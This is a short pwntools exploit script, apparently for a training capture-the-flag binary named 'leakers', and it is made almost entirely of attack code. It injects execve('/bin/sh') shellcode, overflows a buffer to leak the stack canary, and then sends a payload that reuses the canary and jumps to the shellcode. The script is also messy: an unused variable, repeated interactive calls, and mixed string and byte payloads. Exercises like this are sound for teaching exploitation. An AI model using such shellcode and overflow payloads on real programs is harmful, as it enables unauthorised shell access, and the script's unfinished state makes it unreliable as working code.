from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
r = process("./leakers")
gdb.attach(r,'''
b * 0x004011f8
b * 0x00401205
b * 0x0040125a
''')
#input("wait")
#r = remote("bin.training.offdef.it", 3001)


asm_code = """
mov rax, 0x3b
xor rsi, rsi
xor rdx, rdx
mov rdi, 0x404080
add rdi, 0x20
syscall
"""
context.arch = 'amd64'
stringa = "/bin/sh"
shellcode = asm(asm_code)
res = shellcode + (b"/bin/sh")
r.send(res)
print("sent first shellcode")


input("wait")
tosend = b"A" * 105
shell2 = asm(asm_code)
r.send(tosend)
print("sent second shellcode\n")

r.interactive()
print("insert canary\n")
canary = input()
r.interactive()
tosend = ('\x41' * 104) + '\x00' + canary + (('\x61')*8) + '\x80\x40\x40\x00\x00\x00\x00\x00'
input("wait")
r.send(tosend)

r.interactive()